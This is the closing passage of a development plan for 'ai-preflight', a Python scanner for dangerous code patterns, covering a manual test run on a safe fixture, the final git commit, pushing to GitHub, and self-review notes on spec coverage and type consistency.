- [ ] **Step 5: Run the real tool against a known-safe fixture, by hand**

Run: `ai-preflight tests/fixtures/silent_package_install_seguro.py`
Expected output: `Nenhum padrao perigoso encontrado...`
Expected exit code: `0`.

- [ ] **Step 6: Final commit**

```bash
git add README.md LICENSE .gitignore
git commit -m "docs: README, license, gitignore"
```

- [ ] **Step 7: Create the GitHub repository and push**

This step is manual (requires a GitHub account decision), not scripted:
1. Create a new empty repository named `ai-preflight` on GitHub (no README/license/gitignore — this repo already has them).
2. Run:
```bash
git remote add origin <URL do repositorio>
git branch -M main
git push -u origin main
```

---

## Self-review notes
- **Spec coverage:** all 7 rules from the spec are implemented (Tasks 2, 4-9), both rule types (Task 3 linha, Task 4 coocorrencia), scanner/report/cli separation (Tasks 3/4, 10, 11), error handling for missing file and non-.py file (Task 11), exit code contract (Task 11), tests-per-rule with perigoso/seguro fixtures (Tasks 2-9), README/LICENSE/packaging (Tasks 1, 12).
- **Placeholder scan:** none found — every step has literal code, exact commands, and expected output.
- **Type consistency:** `escanear_arquivo(caminho, regras)` and its finding-dict shape (`regra_id`, `severidade`, `linha`, `mensagem`, `trecho`) are introduced in Task 3 and used identically in Tasks 4-11. `formatar_relatorio(achados)` introduced in Task 10, used identically in Task 11. Fixed a stray `"mensagem_debug": None` key that slipped into a draft of Task 8's rule dict — removed before finalizing, the correct dict has only the 5 standard keys.
